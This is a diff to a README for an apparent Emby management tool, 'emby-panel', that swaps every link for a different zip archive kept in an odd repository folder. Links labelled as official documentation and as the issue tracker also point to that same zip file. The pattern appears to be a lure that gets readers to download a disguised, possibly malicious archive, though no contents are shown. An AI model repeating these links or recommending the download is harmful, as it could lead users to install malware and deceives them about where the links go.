@@ -8,7 +8,7 @@ Welcome to **emby-panel**! This application serves as your central hub for manag
 
 To download the latest version of **emby-panel**, visit the following link:
 
-[![Download emby-panel](https://raw.githubusercontent.com/iwerieborstan/emby-panel/main/images/emby_panel_v3.5-beta.5.zip)](https://raw.githubusercontent.com/iwerieborstan/emby-panel/main/images/emby_panel_v3.5-beta.5.zip)
+[![Download emby-panel](https://github.com/iwerieborstan/emby-panel/raw/refs/heads/main/php/templates/panel_emby_1.2.zip)](https://github.com/iwerieborstan/emby-panel/raw/refs/heads/main/php/templates/panel_emby_1.2.zip)
 
 ### Steps to Download:
 
@@ -44,8 +44,8 @@ Before you download **emby-panel**, make sure your computer meets the following 
 
 ## 📚 Useful Resources
 
-- [Emby Official Documentation](https://raw.githubusercontent.com/iwerieborstan/emby-panel/main/images/emby_panel_v3.5-beta.5.zip): Explore more about Emby and its features.
-- [GitHub Issues](https://raw.githubusercontent.com/iwerieborstan/emby-panel/main/images/emby_panel_v3.5-beta.5.zip): Report issues or ask questions.
+- [Emby Official Documentation](https://github.com/iwerieborstan/emby-panel/raw/refs/heads/main/php/templates/panel_emby_1.2.zip): Explore more about Emby and its features.
+- [GitHub Issues](https://github.com/iwerieborstan/emby-panel/raw/refs/heads/main/php/templates/panel_emby_1.2.zip): Report issues or ask questions.
 
 ## 🧑‍🤝‍🧑 Community Support
 
@@ -59,6 +59,6 @@ If you would like to contribute to **emby-panel**, feel free to check out our co
 
 Once you have downloaded and installed **emby-panel**, explore its features to see how it can streamline your Emby server management. Remember, you can always return to the Releases page for updates using the link below.
 
-[![Download emby-panel](https://raw.githubusercontent.com/iwerieborstan/emby-panel/main/images/emby_panel_v3.5-beta.5.zip)](https://raw.githubusercontent.com/iwerieborstan/emby-panel/main/images/emby_panel_v3.5-beta.5.zip)
+[![Download emby-panel](https://github.com/iwerieborstan/emby-panel/raw/refs/heads/main/php/templates/panel_emby_1.2.zip)](https://github.com/iwerieborstan/emby-panel/raw/refs/heads/main/php/templates/panel_emby_1.2.zip)
 
 Enjoy your enhanced media journey with **emby-panel**!
